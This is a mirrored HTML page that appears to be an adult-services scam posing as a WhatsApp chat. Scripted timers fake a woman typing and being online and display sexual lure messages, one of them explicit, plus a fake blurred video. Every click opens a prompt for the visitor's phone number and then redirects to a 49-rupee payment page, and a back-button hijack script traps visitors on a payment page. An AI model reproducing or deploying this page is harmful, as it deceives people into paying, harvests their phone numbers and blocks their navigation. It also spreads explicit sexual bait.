<html lang="en" dir="ltr">
	
	

<!-- Mirrored from hostelgirl.info/whatsapp.php?web=sex2 by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 09 Sep 2025 20:03:36 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
    <title>Priya - Online</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="preconnect" href="https://fonts.googleapis.com/">
    <meta name="theme-color" content="#075e54">
    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
    <link href="push/css/sweetalert2.min.css" rel="stylesheet" />
    <link rel="stylesheet" href="assets/whtsap/css/style.css">
    <link rel="stylesheet" href="assets/whtsap/css/font-awesome.min.css">
    <script type="text/javascript">
        Stamp = new Date();
         var Hours;
         var Mins;
         Hours = Stamp.getHours();
         Mins = Stamp.getMinutes();
         if (Hours < 10){
             Hours = "0" + Hours;
         }
         if (Mins < 10){
             Mins = "0" + Mins;
         }
    </script>
    <style type="text/css">
        .dl-layout {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%,-50%);
            padding: 18px 9px;
            border-radius: 60px;
            width: 150px;
            text-align: center;
        }
        
        .time-layout {
            position: absolute;
            top: 500%;
            left: 95%;
            transform: translate(-50%,-50%);
            padding: 18px 9px;
            border-radius: 60px;
            width: 150px;
            text-align: center;
            color: #ffffff;
        }
        
        .video-layout {
            position: absolute;
            top: 500%;
            left: 10%;
            transform: translate(-50%,-50%);
            padding: 18px 9px;
            border-radius: 60px;
            width: 150px;
            text-align: center;
            color: #ffffff;
        }
        
        .time-layout-2 {
            position: absolute;
            top: 217%;
            left: 95%;
            transform: translate(-50%,-50%);
            padding: 18px 9px;
            border-radius: 60px;
            width: 150px;
            text-align: center;
            color: #ffffff;
        }
        
        .video-layout-2 {
            position: absolute;
            top: 217%;
            left: 10%;
            transform: translate(-50%,-50%);
            padding: 18px 9px;
            border-radius: 60px;
            width: 150px;
            text-align: center;
            color: #ffffff;
        }
        
        .dl-icon {
            width: 60px;
            height: 60px;
            vertical-align: middle;
        }
        
        img.video-icon {
          vertical-align: text-bottom;
        }
        
        .dl-text {
            font-size: 18px;
            color: #fff;
            display: inline;
            margin-left: 6px;
            vertical-align: middle;
        }
        
        .steps {
            text-align: left;
            margin-bottom: -20px;
        }
        
        #message-1, #message-audio,#message-video, #last-online, #play-2 {
            display: none;
        }
        .typing {
          align-items: center;
            display: flex;
            height: 17px;
            margin-bottom: -21px;
        }
        .typing .dot {
          animation: mercuryTypingAnimation 1.8s infinite ease-in-out;
          background-color: #008069;
          border-radius: 50%;
          height: 7px;
          margin-right: 4px;
          vertical-align: middle;
          width: 7px;
          display: inline-block;
        }
        .typing .dot:nth-child(1) {
          animation-delay: 200ms;
        }
        .typing .dot:nth-child(2) {
          animation-delay: 300ms;
        }
        .typing .dot:nth-child(3) {
          animation-delay: 400ms;
        }
        .typing .dot:last-child {
          margin-right: 0;
        }
        
        .audio-img{
            width: 200px;
        }
        #message-audio{
            cursor: pointer;
        }
        .profile-photo{
          width: 30px;
          height: 30px;
          border-radius: 50%;
        
        }
        
        @keyframes mercuryTypingAnimation {
          0% {
            transform: translateY(0px);
            background-color:#008069; 
          }
          28% {
            transform: translateY(-7px);
            background-color:#008069;}
          44% {
            transform: translateY(0px);
            background-color: #008069; 
          }
        }
    </style>
</head>
<body>
		
    <header class="_23P3O profile">
        <div class="_2YnE3" title="Profile Details" role="button">
            <div class="_3GlyB" style="height: 40px; width: 40px;">
                <div class="_1lPgH"></div><img src="uploads/priya.jpg" alt="" draggable="false" class="_8hzr9 M0JmA i0jNr" style="visibility: visible;"></div>
        </div>
        <div class="_24-Ff" role="button">
            <div class="_2rlF7">
                <div class="_21nHd"><span dir="auto" title="Priya Kumari" class="ggj6brxn gfz4du6o r7fjleex g0rxnol2 lhj4utae le5p0ye3 l7jjieqr i0jNr">+9179826XXXXX</span></div>
            </div>
            <div class="zzgSd _3e6xi"><span id="last-typing" title="last seen yesterday at 19:40" class="_2YPr_ i0jNr selectable-text copyable-text">online</span><span id="last-online" title="last seen yesterday at 19:40" class="_2YPr_ i0jNr selectable-text copyable-text">online</span></div>
        </div>
        <div class="_1yNrt">
            <div class="_1QVfy _3UaCz">
                <div class="_2cNrC">
                    <div aria-disabled="false" role="button" tabindex="0" class="_26lC3 video-call" data-tab="6" title="Searchâ€¦" aria-label="Search"><span data-testid="search-alt" data-icon="search-alt" class=""><img src="assets/whtsap/img/video-call.webp" width="24px"></span></div><span></span></div>
                <div>
                    <div class="_1yNrt">
                        <div class="_1QVfy _3UaCz">
                            <div class="_2cNrC">
                                <div aria-disabled="false" role="button" tabindex="0" class="_26lC3 call" data-tab="6" title="Searchâ¦" aria-label="Search¦"><span data-testid="search-alt" data-icon="search-alt" class=""><img src="assets/whtsap/img/call.webp" width="20px"></span></div><span></span></div>
                            <div>
                                <div class="_2cNrC">
                                    <div aria-disabled="false" role="button" tabindex="0" class="_26lC3 profile" data-tab="6" title="Menu" aria-label="Menu"><span data-testid="menu" data-icon="menu" class=""><svg viewbox="0 0 24 24" width="24" height="24" class=""><path fill="currentColor" d="M12 7a2 2 0 1 0-.001-4.001A2 2 0 0 0 12 7zm0 2a2 2 0 1 0-.001 3.999A2 2 0 0 0 12 9zm0 6a2 2 0 1 0-.001 3.999A2 2 0 0 0 12 15z"></path></svg></span></div><span></span></div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </header>
    <div class="_1LcQK">
        <div class="tm2tP copyable-area"><span></span>
            <div class="_27Uai"><span></span></div>
            <div class="_33LGR" tabindex="0">
                <div class="_2AL2u"></div>
                <div tabindex="-1" class="y8WcF" data-tab="8" role="region" aria-label="Message list. Press right arrow key on a message to open message context menu.">
                    <div class="_2wUmf V-zSs focusable-list-item" tabindex="-1">
                        <div class="cvjcv EtBAv"><span dir="auto" class="i0jNr">TODAY</span></div>
                    </div>
                    <div tabindex="-1" class="_2wUmf V-zSs focusable-list-item" data-id="true_919566564106@c.us_CA5B965698DB501BA5A0340BD9345E40"><span></span><span dir="ltr" class="i0jNr"></span></div><span></span></div>
            </div>
        </div>

        <div tabindex="-1" class="_2wUmf chat-1 message-in focusable-list-item" data-id="false_919159555721@c.us_1FC315E5B4218B6F00BBC34DF3F0FDAD"><span></span>
            <div class="cvjcv _1Ilru _8YVHI"><span data-testid="tail-in" data-icon="tail-in" class="_3nrYb"><svg viewbox="0 0 8 13" width="8" height="13" class=""><path opacity=".13" fill="#0000000" d="M1.533 3.568 8 12.193V1H2.812C1.042 1 .474 2.156 1.533 3.568z"></path><path fill="currentColor" d="M1.533 2.568 8 11.193V0H2.812C1.042 0 .474 1.156 1.533 2.568z"></path></svg></span>
                <div
                class="Nm1g1 _22AX6"><span aria-label="Honest Raj Frd:"></span>
                    <div class="_22Msk">
                        <div class="copyable-text" data-pre-plain-text="[20:10, 31/01/2022] Honest Raj Frd: ">
                            <div class="_1Gy50"><span dir="ltr" class="i0jNr selectable-text copyable-text"><span>🤗 Hello</span></span><span class="_20bHr"></span></div>
                        </div>
                        <div class="_1beEj">
                            <div class="gq1t1y46 lak21jic e4p1bexh cr2cog7z le5p0ye3 _1WSmF" data-testid="msg-meta"><span class="l7jjieqr fewfhwl7" dir="auto"><span id='display'><script type="text/javascript">document.write(Hours + ":" + Mins);</script></span></span>
                            </div>
                        </div>
                    </div><span></span></div>
        </div>
    </div>
	
	<div id="typing-2" tabindex="-1" class="_2wUmf chat-1 message-in focusable-list-item" data-id="false_919159555721@c.us_1FC315E5B4218B6F00BBC34DF3F0FDAD"><span></span>
        <div class="cvjcv _1Ilru _8YVHI"><span data-testid="tail-in" data-icon="tail-in" class="_3nrYb"><svg viewbox="0 0 8 13" width="8" height="13" class=""><path opacity=".13" fill="#0000000" d="M1.533 3.568 8 12.193V1H2.812C1.042 1 .474 2.156 1.533 3.568z"></path><path fill="currentColor" d="M1.533 2.568 8 11.193V0H2.812C1.042 0 .474 1.156 1.533 2.568z"></path></svg></span>
            <div
            class="Nm1g1 _22AX6"><span aria-label="Honest Raj Frd:"></span>
                <div class="_22Msk">
                    <div class="copyable-text" data-pre-plain-text="[20:10, 31/01/2022] Honest Raj Frd: ">
                        <div class="_1Gy50"><span dir="ltr" class="i0jNr selectable-text copyable-text"><span><div class="typing">
  <div class="dot"></div>
  <div class="dot"></div>
  <div class="dot"></div>
</div></span></span><span class="_20bHr"></span></div>
                    </div>
                    <div class="_1beEj">
                        <div class="gq1t1y46 lak21jic e4p1bexh cr2cog7z le5p0ye3 _1WSmF" data-testid="msg-meta"><span class="l7jjieqr fewfhwl7" dir="auto"><span id='display'></span></span>
                        </div>
                    </div>
                </div><span></span></div>
    </div>
    </div>
	<div id="name_div" style="display:none;" tabindex="-1" class="_2wUmf chat-1 message-in focusable-list-item" data-id="false_919159555721@c.us_1FC315E5B4218B6F00BBC34DF3F0FDAD"><span></span>
            <div class="cvjcv _1Ilru _8YVHI"><span data-testid="tail-in" data-icon="tail-in" class="_3nrYb"><svg viewbox="0 0 8 13" width="8" height="13" class=""><path opacity=".13" fill="#0000000" d="M1.533 3.568 8 12.193V1H2.812C1.042 1 .474 2.156 1.533 3.568z"></path><path fill="currentColor" d="M1.533 2.568 8 11.193V0H2.812C1.042 0 .474 1.156 1.533 2.568z"></path></svg></span>
                <div
                class="Nm1g1 _22AX6"><span aria-label="Honest Raj Frd:"></span>
                    <div class="_22Msk">
                        <div class="copyable-text" data-pre-plain-text="[20:10, 31/01/2022] Honest Raj Frd: ">
                            <div class="_1Gy50"><span dir="ltr" class="i0jNr selectable-text copyable-text"><span>😘🩱 Welcome to Phone sex services💋💦👙🤤</span></span><span class="_20bHr"></span></div>
                        </div>
                        <div class="_1beEj">
                            <div class="gq1t1y46 lak21jic e4p1bexh cr2cog7z le5p0ye3 _1WSmF" data-testid="msg-meta"><span class="l7jjieqr fewfhwl7" dir="auto"><span id='display'><script type="text/javascript">document.write(Hours + ":" + Mins);</script></span></span>
                            </div>
                        </div>
                    </div><span></span></div>
        </div>
    </div>
	<div id="msg_div" style="display:none;" tabindex="-1" class="_2wUmf chat-1 message-in focusable-list-item" data-id="false_919159555721@c.us_1FC315E5B4218B6F00BBC34DF3F0FDAD"><span></span>
            <div class="cvjcv _1Ilru _8YVHI"><span data-testid="tail-in" data-icon="tail-in" class="_3nrYb"><svg viewbox="0 0 8 13" width="8" height="13" class=""><path opacity=".13" fill="#0000000" d="M1.533 3.568 8 12.193V1H2.812C1.042 1 .474 2.156 1.533 3.568z"></path><path fill="currentColor" d="M1.533 2.568 8 11.193V0H2.812C1.042 0 .474 1.156 1.533 2.568z"></path></svg></span>
                <div
                class="Nm1g1 _22AX6"><span aria-label="Honest Raj Frd:"></span>
                    <div class="_22Msk">
                        <div class="copyable-text" data-pre-plain-text="[20:10, 31/01/2022] Honest Raj Frd: ">
                            <div class="_1Gy50"><span dir="ltr" class="i0jNr selectable-text copyable-text"><span>👙 SEX ❤ करो अभी 👅😛 नंगा करो। 💋 वीडियो कॉल पे मुझे चोदो 💦🤤 </span></span><span class="_20bHr"></span></div>
                        </div>
                        <div class="_1beEj">
                            <div class="gq1t1y46 lak21jic e4p1bexh cr2cog7z le5p0ye3 _1WSmF" data-testid="msg-meta"><span class="l7jjieqr fewfhwl7" dir="auto"><span id='display'><script type="text/javascript">document.write(Hours + ":" + Mins);</script></span></span>
                            </div>
                        </div>
                    </div><span></span></div>
        </div>
    </div>

    <div id="typing-1" style="display:none;" tabindex="-1" class="_2wUmf chat-1 message-in focusable-list-item" data-id="false_919159555721@c.us_1FC315E5B4218B6F00BBC34DF3F0FDAD"><span></span>
        <div class="cvjcv _1Ilru _8YVHI"><span data-testid="tail-in" data-icon="tail-in" class="_3nrYb"><svg viewbox="0 0 8 13" width="8" height="13" class=""><path opacity=".13" fill="#0000000" d="M1.533 3.568 8 12.193V1H2.812C1.042 1 .474 2.156 1.533 3.568z"></path><path fill="currentColor" d="M1.533 2.568 8 11.193V0H2.812C1.042 0 .474 1.156 1.533 2.568z"></path></svg></span>
            <div
            class="Nm1g1 _22AX6"><span aria-label="Honest Raj Frd:"></span>
                <div class="_22Msk">
                    <div class="copyable-text" data-pre-plain-text="[20:10, 31/01/2022] Honest Raj Frd: ">
                        <div class="_1Gy50"><span dir="ltr" class="i0jNr selectable-text copyable-text"><span><div class="typing">
  <div class="dot"></div>
  <div class="dot"></div>
  <div class="dot"></div>
</div></span></span><span class="_20bHr"></span></div>
                    </div>
                    <div class="_1beEj">
                        <div class="gq1t1y46 lak21jic e4p1bexh cr2cog7z le5p0ye3 _1WSmF" data-testid="msg-meta"><span class="l7jjieqr fewfhwl7" dir="auto"><span id='display'></span></span>
                        </div>
                    </div>
                </div><span></span></div>
    </div>
    </div>

    
    <div id="message-video">
        <div tabindex="0" class="_2wUmf chat-1 message-in focusable-list-item" data-id="false_919566564106@c.us_F172B084BBB437F78B9833F401317B7F"><span></span>
            <div class="cvjcv _3QK-g _8YVHI"><span data-testid="tail-in" data-icon="tail-in" class="_3nrYb"><svg viewbox="0 0 8 13" width="8" height="13" class=""><path opacity=".13" fill="#0000000" d="M1.533 3.568 8 12.193V1H2.812C1.042 1 .474 2.156 1.533 3.568z"></path><path fill="currentColor" d="M1.533 2.568 8 11.193V0H2.812C1.042 0 .474 1.156 1.533 2.568z"></path></svg></span>
                <div
                class="Nm1g1 _22AX6"><span aria-label="Naveen Kumar:"></span>
                    <div class="cm280p3y kbtdaxqp ocd2b0bc folpon7g aa0kojfi snweb893 g0rxnol2 jnl3jror">
                        <div>
                            <div role="button" class="gndfcl4n l8fojup5 paxyh2gw sfeitywo cqsf3vkf ajgl1lbb p357zi0d ac2vgrno laorhtua gfz4du6o r7fjleex g0rxnol2" style="width: auto; height: auto;">
                                <div id="play" class="_1bJJV">
                                    <div onclick="myFunction()" class="_3IfUe"><img src="assets/whtsap/img/videoblur1.png" class="jciay5ix tvf2evcx oq44ahr5 lb5m6g5c fsmudgz7" style="height: 280px;">
                                        <a style="font-size:18px;position: absolute;top: 50%;left: 50%;transform: translate(-50%, -50%);text-align: center;width: 50%;color: white;background-color: #282828;padding: 15px;border-radius: 60px;"><i class="fa fa-download"></i> 8.6 MB</a>
                                        <div class="dl-layout"></div>
                                        <div class="time-layout">
                                            <span id='display'><script type="text/javascript">document.write(Hours + ":" + Mins);</script></span></div>
                                        <div class="video-layout">
                                            <span id='display'><img class="video-icon" src="assets/whtsap/img/video-camera.png" width="15" height="15"><strong> 2:41</strong></span></div>
                                    </div>
                                </div>
                            </div>
                            <div id="play-2" class="_1bJJV">
                                <div class="_3IfUe box"><img src="uploads/7.gif" class="jciay5ix tvf2evcx oq44ahr5 lb5m6g5c new-blur" style="height: 300px;">
                                    <div class="dl-layout">
                                        <img src="assets/whtsap/img/play-button.png" class="dl-icon" alt="Download">
                                        <div class="time-layout-2">
                                            <span id='display'><script type="text/javascript">document.write(Hours + ":" + Mins);</script></span></div>
                                        <div class="video-layout-2">
                                            <span id='display'><img class="video-icon" src="assets/whtsap/img/video-camera.png" width="15" height="15"><strong> 2:41</strong></span></div>
                                    </div>
                                </div>
                            </div>
                            <div class="_23IDz"></div>
                        </div>
                        <div class="dpkuihx7 lhggkp7q j2mzdvlq b9fczbqn"></div>
                    </div>
            </div><span></span></div>
    </div>
    </div>
    </div>

    <div class="VjtCX" style="height: 0px;"></div>
    <div class="footer">
        <div class="footer-content">
            <div class="_3HQNh _1un-p">
                <div data-state="closed" class="g0rxnol2 p357zi0d d1pdhp1p bugiwsl0 rj4tx0cq cx8fzybs fyy3ld6e">
                    <button tabindex="-1" class="lhggkp7q mvj9yovn f804f6gw fyy3ld6e svlsagor dntxsmpk ixn6u0rb s2vc4xk1 o0wkt7aw t1844p82 esbo3we0 qizq0yyl b9fczbqn oybnjv0e" aria-label="Open emojis panel" data-tab="10" style="transform: translateX(0px);">
                        <div class="message"><span data-testid="smiley" data-icon="smiley" class=""><svg viewbox="0 0 24 24" width="24" height="24" class="ekdr8vow dhq51u3o"><path fill="currentColor" d="M9.153 11.603c.795 0 1.439-.879 1.439-1.962s-.644-1.962-1.439-1.962-1.439.879-1.439 1.962.644 1.962 1.439 1.962zm-3.204 1.362c-.026-.307-.131 5.218 6.063 5.551 6.066-.25 6.066-5.551 6.066-5.551-6.078 1.416-12.129 0-12.129 0zm11.363 1.108s-.669 1.959-5.051 1.959c-3.505 0-5.388-1.164-5.607-1.959 0 0 5.912 1.055 10.658 0zM11.804 1.011C5.609 1.011.978 6.033.978 12.228s4.826 10.761 11.021 10.761S23.02 18.423 23.02 12.228c.001-6.195-5.021-11.217-11.216-11.217zM12 21.354c-5.273 0-9.381-3.886-9.381-9.159s3.942-9.548 9.215-9.548 9.548 4.275 9.548 9.548c-.001 5.272-4.109 9.159-9.382 9.159zm3.108-9.751c.795 0 1.439-.879 1.439-1.962s-.644-1.962-1.439-1.962-1.439.879-1.439 1.962.644 1.962 1.439 1.962z"></path></svg></span></div>
                    </button>
                </div>
                <div class="_2jitM">
                    <div class="_2cNrC">
                        <div aria-disabled="false" role="button" tabindex="0" class="_26lC3 message" data-tab="10" title="Attach" aria-label="Attach"><span data-testid="clip" data-icon="clip" class=""><svg viewbox="0 0 24 24" width="24" height="24" class=""><path fill="currentColor" d="M1.816 15.556v.002c0 1.502.584 2.912 1.646 3.972s2.472 1.647 3.974 1.647a5.58 5.58 0 0 0 3.972-1.645l9.547-9.548c.769-.768 1.147-1.767 1.058-2.817-.079-.968-.548-1.927-1.319-2.698-1.594-1.592-4.068-1.711-5.517-.262l-7.916 7.915c-.881.881-.792 2.25.214 3.261.959.958 2.423 1.053 3.263.215l5.511-5.512c.28-.28.267-.722.053-.936l-.244-.244c-.191-.191-.567-.349-.957.04l-5.506 5.506c-.18.18-.635.127-.976-.214-.098-.097-.576-.613-.213-.973l7.915-7.917c.818-.817 2.267-.699 3.23.262.5.501.802 1.1.849 1.685.051.573-.156 1.111-.589 1.543l-9.547 9.549a3.97 3.97 0 0 1-2.829 1.171 3.975 3.975 0 0 1-2.83-1.173 3.973 3.973 0 0 1-1.172-2.828c0-1.071.415-2.076 1.172-2.83l7.209-7.211c.157-.157.264-.579.028-.814L11.5 4.36a.572.572 0 0 0-.834.018l-7.205 7.207a5.577 5.577 0 0 0-1.645 3.971z"></path></svg></span></div><span></span></div>
                </div>
            </div>
            <div tabindex="-1" class="p3_M1 message">
                <div tabindex="-1" class="_1UWac _1LbR4">
                    <div class="_2vbn4" style="visibility: visible;">Type a message</div>
                </div>
            </div>
            <div class="_3HQNh _1Ae7k message">
                <button class="_30ggS" aria-label="Voice message" data-tab="11"><span data-testid="ptt" data-icon="ptt" class=""><svg viewbox="0 0 24 24" width="24" height="24" class=""><path fill="currentColor" d="M11.999 14.942c2.001 0 3.531-1.53 3.531-3.531V4.35c0-2.001-1.53-3.531-3.531-3.531S8.469 2.35 8.469 4.35v7.061c0 2.001 1.53 3.531 3.53 3.531zm6.238-3.53c0 3.531-2.942 6.002-6.237 6.002s-6.237-2.471-6.237-6.002H3.761c0 4.001 3.178 7.297 7.061 7.885v3.884h2.354v-3.884c3.884-.588 7.061-3.884 7.061-7.885h-2z"></path></svg></span></button>
            </div>
        </div>
    </div>
		
	
	<style>
	.loader {
    position: fixed;
    width: 100%;
    height: 100vh;
    background: #000000;
    display: none;
    left: 0;
    top: 0;
    z-index: 999999;
}

.loader img {
    width: 120px;
    margin-left: calc(50% - 60px);
    margin-top: 80px;
}

.loader h4 {
    position: fixed;
    width: 200px;
    height: 40px;
    left: 0;
    text-align: center;
    top: calc(50% - 120px);
    left: calc(50% - 100px);
    font-weight: bold;
    font-size: 30px;
    color: red;
}

.loader p:first-child {
    margin-top: 300px
}

.loader p {
    width: 95%;
    margin-left: auto;
    margin-right: auto;
    font-size: 24px;
    color: #fff;
    font-weight: bold;
    text-align: center;
    text-shadow: 1px 1px 2px #000, 1px 1px 2px #000, 1px 1px 2px #000;
}
</style>

<div class="loader">
    <img src="200w.gif">
    <p>इंतज़ार करे हम आपका संदेश भेज रहे है। सन्देश भेजे जाने पर 49 रुपए देने होंगे। भुगतान करते ही आपको <span>Sunita</span> का नंबर मिल जायेगा
    </p>
    <p>Wait, we are sending your message. You will have to pay 49 rupees after sending the message. You will get <span>Sunita</span>'s number
        once you
        make the payment.</p>
</div>    <script src="assets/whtsap/js/jquery-3.7.1.min.js"></script>
    <script src="assets/whtsap/js/sweetalert2.js"></script>
	<script>
        function myFunction() {
          $('#play').hide();
          $('#play-2').show(); 
        }
	setTimeout(function() {
        $('#typing-2').hide();
		$('#name_div').show();
        $('#msg_div').show();
		//$('#typing-1').show();
    }, 3000); 
	
	/*setTimeout(function() {
        $('#typing-1').hide();
    }, 6000); */
	// 
	setTimeout(function() {
        //$('#message-audio').show();
        $('#message-video').show();
    }, 3001); // <-- time in milliseconds
        
	setTimeout(function() {
        $('#last-typing').hide();
    }, 3000); // <-- time in milliseconds
     
	 setTimeout(function() {
        $('#last-online').show();
    }, 3001); // <-- time in milliseconds
	async function start() {
  const { value: phoneNumber } = await Swal.fire({
    imageUrl: "uploads/7.gif",
    imageWidth: 300,
    imageHeight: 300,
    allowOutsideClick: false,
    input: "number",
    inputLabel: "Enter Your Mobile Number",
    showCancelButton: true,
    confirmButtonColor: "green",
    cancelButtonColor: "red",
    confirmButtonText: "👙 Video Call",
    inputAttributes: {
      maxlength: "10",
      placeholder: "Mobile Number",
      required: true
    },
    inputValidator: (value) => {
      if (!value) {
        return "Please enter 10 digit number.";
      }
      var ph = /^(0|91)?[6-9][0-9]{9}$/;
      if (!value.match(ph) || value.length != 10) {
        return "Please enter 10 digit number.";
      }
      
    }
    
  });

  if (phoneNumber) {
    const amount = 49;

    // redirect with query params
    window.location.href =
      "recharge_me14d4.php?phone=" + encodeURIComponent(phoneNumber) +
      "&amount=" + encodeURIComponent(amount);
      
  }
  
}
		i = 0;
        $('.box').click(function () {
           i++;
               start();
        });
		$('.p3_M1').click(function () {
               start();
        });
		$('._3HQNh').click(function () {
               start();
        });
		$('._2cNrC').click(function () {
               start();
        });


    </script>
	<style>
	.swal2-image {
		max-width: 100%;
		margin: 1.25em auto;
	}
	</style>
	
	<script>
  // Push a dummy state so back button stays on this page
  history.pushState(null, null, location.href);

  window.onpopstate = function () {
    // Redirect when back button is pressed
    window.location.href = "49paye2fa.php";
  };
</script>

</body>


<!-- Mirrored from hostelgirl.info/whatsapp.php?web=sex2 by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 09 Sep 2025 20:03:39 GMT -->
</html> 